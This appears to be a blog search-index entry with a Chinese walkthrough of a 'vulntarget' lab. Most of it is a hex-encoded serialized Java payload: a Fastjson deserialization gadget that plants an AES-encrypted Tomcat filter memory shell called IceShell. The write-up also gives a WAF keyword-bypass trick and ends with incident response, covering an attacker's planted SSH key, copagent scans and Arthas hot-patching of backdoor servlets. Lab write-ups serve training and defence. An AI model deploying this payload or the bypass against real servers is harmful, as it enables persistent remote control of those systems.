426173650100324c6f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173653b01000f7374616e64617264436f6e7465787401002a4c6f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578743b010007436f6e666967730100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d66696c746572436f6e6669677301000a536f7572636546696c6501000d4963655368656c6c2e6a6176610c00630064010010336164326664646665386261643865360c006000610100256a617661782f736572766c65742f687474702f48747470536572766c6574526571756573740100266a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73650c013101320100116a6176612f7574696c2f486173684d61700c013301340701350c013601370c013801390c013a013b010004504f535407013c0c0109013d0c013e013f0c0140013f0c0141013b0100156a6176612e6c616e672e436c6173734c6f616465720c0093009407012c0c007001420701430c0144014701026479763636766741414144514147676f41424141554367414541425548414259484142634241415938615735706444344241426f6f54477068646d4576624746755a7939446247467a633078765957526c636a73705667454142454e765a4755424141394d6157356c546e5674596d5679564746696247554241424a4d62324e6862465a68636d6c68596d786c56474669624755424141523061476c7a415141445446553741514142597745414630787159585a684c327868626d63765132786863334e4d6232466b5a584937415141425a7745414653686251696c4d616d4632595339735957356e4c304e7359584e7a4f7745414157494241414a6251674541436c4e7664584a6a5a555a706247554241415a564c6d7068646d454d41415541426777414741415a415141425651454146577068646d4576624746755a7939446247467a633078765957526c636745414332526c5a6d6c755a554e7359584e7a415141584b46744353556b7054477068646d4576624746755a7939446247467a637a734149514144414151414141414141414941414141464141594141514148414141414f67414341414941414141474b6975334141477841414141416741494141414142674142414141414167414a4141414146674143414141414267414b4141734141414141414159414441414e414145414151414f41413841415141484141414150514145414149414141414a4b6973444b37363341414b7741414141416741494141414142674142414141414177414a4141414146674143414141414351414b414173414141414141416b4145414152414145414151415341414141416741540701480c0149014a01000b646566696e65436c61737301000f6a6176612f6c616e672f436c61737307014b0c014c00730c014d014e07012f0c014f0150010001550c015101520100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0100106a6176612f6c616e672f4f626a6563740c015301540c015501560100156a6176612f6c616e672f436c6173734c6f616465720c015701580701590c015a01390c015b015c0100016707012d0c015d015e01000341455307015f0c0160016101001f6a617661782f63727970746f2f737065632f5365637265744b6579537065630c016201630c006301640c006a016501001673756e2f6d6973632f4241534536344465636f6465720c016601670701680c0169013b0c016a014a0c016b016c0c015b016d010006657175616c730100136a6176612f6c616e672f457863657074696f6e01000c4175746f6d6e6547726565740100306f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173650c016e016f0701700c017101720100286f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578740100286f72672e6170616368652e636174616c696e612e636f72652e5374616e64617264436f6e746578740c017301520c017401750701760c0177017801000d6a6176612f7574696c2f4d617001000c7365632f4963655368656c6c01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465660c0179017a0c017b017c0c017d017c0c017e017f01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61700100062f7368656c6c0c0180017c0701810c018201830c00c1013b0c0184017c0c018501860100306f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e66696701001b6f72672f6170616368652f636174616c696e612f436f6e74657874010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a617661782f736572766c65742f46696c74657201001e6a617661782f736572766c65742f536572766c6574457863657074696f6e01001c6a617661782f736572766c65742f536572766c65745265717565737401001d6a617661782f736572766c65742f536572766c6574526573706f6e73650100196a617661782f736572766c65742f46696c746572436861696e01001e6a617661782f736572766c65742f687474702f4874747053657373696f6e0100136a6176612f696f2f494f457863657074696f6e0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01000a67657453657373696f6e01002228294c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100096765744d6574686f6401001428294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f537472696e67010015284c6a6176612f6c616e672f4f626a6563743b295a010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b01000d6765745375706572636c6173730100076765744e616d65010040284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b29560100106a6176612f7574696c2f42617365363401000a6765744465636f6465720100074465636f64657201000c496e6e6572436c617373657301001c28294c6a6176612f7574696c2f426173653634244465636f6465723b0100186a6176612f7574696c2f426173653634244465636f6465720100066465636f6465010016284c6a6176612f6c616e672f537472696e673b295b420100116a6176612f6c616e672f496e7465676572010004545950450100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000d73657441636365737369626c65010004285a29560100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b01000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100166765744465636c61726564436f6e7374727563746f72010033285b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b01001d6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f7201000e676574436c6173734c6f6164657201000b6e6577496e7374616e6365010027285b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000c736574417474726962757465010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b29560100136a617661782f63727970746f2f43697068657201000b676574496e7374616e6365010029284c6a6176612f6c616e672f537472696e673b294c6a617661782f63727970746f2f4369706865723b010008676574427974657301000428295b42010017285b424c6a6176612f6c616e672f537472696e673b295601001728494c6a6176612f73656375726974792f4b65793b295601000967657452656164657201001a28294c6a6176612f696f2f42756666657265645265616465723b0100166a6176612f696f2f4275666665726564526561646572010008726561644c696e6501000c6465636f6465427566666572010007646f46696e616c010006285b42295b4201001428294c6a6176612f6c616e672f4f626a6563743b01000c6765745265736f757263657301002728294c6f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f743b0100236f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f7401000a676574436f6e7465787401001f28294c6f72672f6170616368652f636174616c696e612f436f6e746578743b010007666f724e616d650100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c64010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000973657446696c746572010019284c6a617661782f736572766c65742f46696c7465723b295601000d73657446696c7465724e616d65010015284c6a6176612f6c616e672f537472696e673b295601000e73657446696c746572436c61737301000c61646446696c746572446566010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b295601000d61646455524c5061747465726e01001c6a617661782f736572766c65742f44697370617463686572547970650100075245515545535401001e4c6a617661782f736572766c65742f44697370617463686572547970653b01000d7365744469737061746368657201001261646446696c7465724d61704265666f7265010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b29560021004b005e0001005f0001001200600061000100620000000200020008000100630064000100650000003d000200010000000b2ab700012a1202b50003b10000000200660000000e00030000002600040024000a002700670000000c00010000000b0068006900000001006a006b00020065000000350000000200000001b10000000200660000000600010000002a00670000001600020000000100680069000000000001006c006d0001006e000000040001006f00010070007100020065000003180006000a000001ab2bc000043a042cc000053a051904b9000601003a06bb000759b700083a07190712091906b9000a0300571907120b1904b9000a0300571907120c1905b9000a030057b8000db6000e3a081904b9000f01001210b600119901541908b60012b60013b600141215b6001199001e1908b60012b600133a092a19091908190619041907b60016a7011e1908b60012b60013b60013b600141215b600119900211908b60012b60013b600133a092a19091908190619041907b60016a700ea1908b60012b60013b60013b60013b600141215b600119900241908b60012b60013b60013b600133a092a19091908190619041907b60016a700b01908b60012b60013b60013b60013b60013b600141215b600119900271908b60012b60013b60013b60013b600133a092a19091908190619041907b60016a700701908b60012b60013b60013b60013b60013b60013b600141215b6001199002a1908b60012b60013b60013b60013b60013b600133a092a19091908190619041907b60016a7002a1908b60012b60013b60013b60013b60013b60013b600133a092a19091908190619041907b600162d2b2cb900170300b100000004006600000072001c0000002d0006002e000c002f00150030001e0031002a00320036003300420034004a003500590037006c0038007600390087003a009d003b00aa003c00bb003d00d4003e00e4003f00f5004001110041012400420135004301540044016a0045017b00470194004801a2004b01aa004e006700000098000f0076001100720073000900aa001100720073000900e4001100720073000901240011007200730009016a001100720073000901940016007200730009000001ab006800690000000001ab007400750001000001ab007600770002000001ab007800790003000601a5007a007b0004000c019f007c007d000500150196007e007f0006001e018d008000810007004a016100820083000800840000000c0001001e018d0080008500070086000000330007ff0087000907008707008807008907008a07008b07008c07008d07008e07008f000033393ffb0045fc0026070090fa0007006e0000000600020091006f000100920064000100650000002b0000000100000001b10000000200660000000600010000005100670000000c00010000000100680069000000010093009400020065000002e50006001200000133b800181219b6001a3a062b121b06bd001c5903121d535904b2001e535905b2001e53b6001f3a07190704b60020013a082c1221b600223a08a700293a0919072c06bd00245903190653590403b800255359051906beb8002553b60026c0001c3a08190804bd001c5903122753b600283a09190904b60029190904bd002459032ab60012b6002a53b6002b3a0a1908122c04bd001c5903121d53b6001f3a0b190b04b6002012023a0c2d122d190cb9002e0300122fb800303a0d190d05bb003159190cb60032122fb70033b60034190dbb003559b700361904b900370100b60038b60039b6003a3a0e190b190a04bd00245903190e53b60026c0001c3a0f190fb6003b3a10190f123c04bd001c5903122453b6001f3a11191104b600201911191004bd00245903190553b6002657a700053a07b1000200300038003b0023000a012d0130003d000400660000006a001a00000054000a005700270058002d00590030005c0038005f003b005d003d005e006100610071006200770063008c0064009e006500a4006600a8006700b2006800b9006900cd006a00e8006b00fd006c0104006d0116006e011c006f012d007101300070013200730067000000c00013003d002400950096000900270106009700980007003000fd009900730008007100bc009a009b0009008c00a1009c009d000a009e008f009e0098000b00a80085009f0061000c00b9007400a000a1000d00e8004500a200a3000e00fd003000a40073000f0104002900a5009d00100116001700a60098001100000133006800690000000001330072007300010000013300820083000200000133007e007f000300000133007a007b000400000133008000810005000a012900a700a3000600840000000c0001000001330080008500050086000000480004ff003b000907008707009007008f07008d07008b07008e07001d0700a807009000010700a925ff00ce000707008707009007008f07008d07008b07008e07001d00010700aa0100ab0000000200ac000100ad00ae000200650000003f0000000300000001b1000000020066000000060001000000760067000000200003000000010068006900000000000100af00b000010000000100b100b20002006e00000004000100b3000100ad00b400020065000000490000000400000001b10000000200660000000600010000007900670000002a0004000000010068006900000000000100af00b000010000000100b500b600020000000100b700b80003006e00000004000100b3000800b9006400010065000001da0005000a000000de123e4bb8000db6000ec0003f4c2bb60040b900410100c000424d1243b800441245b600464e2d04b600472d2cb60048c000493a041904123eb9004a0200c7009cbb004b59b7004c3a05bb004d59b7004e3a0619061905b6004f1906123eb6005019061905b60012b60014b600512c1906b60052bb005359b700543a0719071255b600561907123eb600571907b20058b60059b6005a2c1907b6005b125c05bd001c5903125d535904124d53b600283a08190804b60029190805bd002459032c535904190653b6002bc0005c3a091904123e1909b9000a030057a700044bb10001000000d900dc003d000300660000006600190000007d0003007e000d007f001a008000250081002a0082003400830040008400490085005200860059008700600088006d00890073008a007c008b0083008c008a008d0095008e009b008f00b0009000b6009100cd009200d9009500dc009400dd0097006700000066000a0049009000ba00bb00050052008700bc00bd0006007c005d00be00bf000700b00029009a009b000800cd000c006c00c00009000300d600c100610000000d00cc00c200c30001001a00bf00c400c50002002500b400c600c70003003400a500c80081000400860000000a0003fb00d9420700aa00000200c90000000200ca01460000000a000100e400e101450009707400013170770100787372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d65737361676571007e00055b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0014707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000027372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e00057870000000297400087365632e43335030740009433350302e6a61766174000367656e7371007e00170000001171007e001971007e001a7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00137872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0023787372001e636f6d2e616c69626162612e666173746a736f6e2e4a534f4e417272617900000000000000010200014c00046c69737471007e001378707371007e00220000000177040000000171007e00077878;&quot;,    &#125;&#125;
+
+直接打会发现再次被拦了，说明过滤的userOverridesAsString
+
+直接对其Unicode编码绕过发现还是无法绕过，不过可以通过添加_或+处理关键字绕过
+
+可参考：https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/
+
+
+出现上述报错则说明内存马注入成功
+
+应急响应Ⅲ首先排查隐藏用户、端口、进程等并无异常，接着发现存在ssh后门，直接删除即可
+/home/vulntarget/ &gt;cat ~/.ssh/authorized_keysssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEisTimbKUHUXBUJUo4WbOxTQY9VHM1ZaL35RQgBTwNUWlm353XdHcq8HxA1U9MLp/Lepaw/U5tQ5Y2qF9TzhAUoTiAiwAKREFuLHugeL/eWTyZAnRN/2OQ4XX5IBsMDFbZAvNRUSaOLIAtpNz/ZFj1NDuCWR7p/2EYFB0YvHxaS9OWrUb0Zh21GOQR6apCYY/+IbVVGKr+MwlI0Df0kv7hns9IpapwEctI0rzayL+NYtvFUyterTV4HfnPij7LxyGqK62ZEsJOQSnON+mj1Dp6Ukz1krdUoVmxrEseQe6CJemq3BHolDi7zbQo4BbxnTQUYwzl9li04ZL2h75xQuUEPb6nxVanUEEJ7CT/fIclvCHsdO9MJ5l2V8ROetkukslKlPxEVZ8q2Up1S4SQk90cYLLnj2+wJNSNw343kIOrIjtQY8E16RhVqVMMGmKW5Ui/FU6X/lfKjISjxqBN6HB65Q74ISMD+IN3kVPSI52rwqaea5/TdjKiDxzkO8bAXU= hacker@anonymous
+
+其次在&#x2F;var&#x2F;local&#x2F;目录下也有个app.jar，下载下来反编译看看并未发现异常
+
+拿D盾检测也没发现异常文件
+
+然后用copagent工具检测，运行后会识别正在运行的应用，输入对应ID，会在同目录下生成.copagent目录储存结果
+
+https://github.com/LandGrey/copagent/raw/release/cop.jar
+
+
+result.txt中记录所有的类及危险等级
+
+在class目录下会保存木马以及运行的类
+
+还原出内存马（IceShell是我自己打进去的可以排除掉，剩下就是异常的
+ShellServlet存在很明显的exec
+
+HttpServlet也不难看出很有可能就是内存马
+
+还可以拿D盾来扫描检查
+
+这里热更新我们换一种方式，直接利用Arthas工具反编译并提取ShellServlet类的代码
+jad --source-only ShellServlet &gt; /tmp/ShellServlet.java
+
+
+接着去&#x2F;tmp目录下找到ShellServlet.java进行修改
+
+然后直接让他的类加载器去编译，再去热更新即可
+sc -d *ShellServlet | grep classLoaderHashmc -c 56ae04b4 /tmp/ShellServlet.java -d /var/retransform /var/ShellServlet.class 
+
+
+同理对HttpServlet类进行热更新
+jad --source-only ShellServlet &gt; /tmp/ShellServlet.javavim /tmp/HttpServlet.javasc -d *HttpServlet | grep classLoaderHashmc -c 49c2faae /tmp/HttpServlet.java -d /var/retransform /var/javax/servlet/http/HttpServlet.class
+
+
+
+应急成功，拿下flag3：flag{57f92fa987141af1770d2b0ca894960f}
+
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>vulntarget</tag>
+      </tags>
+  </entry>
+</search>
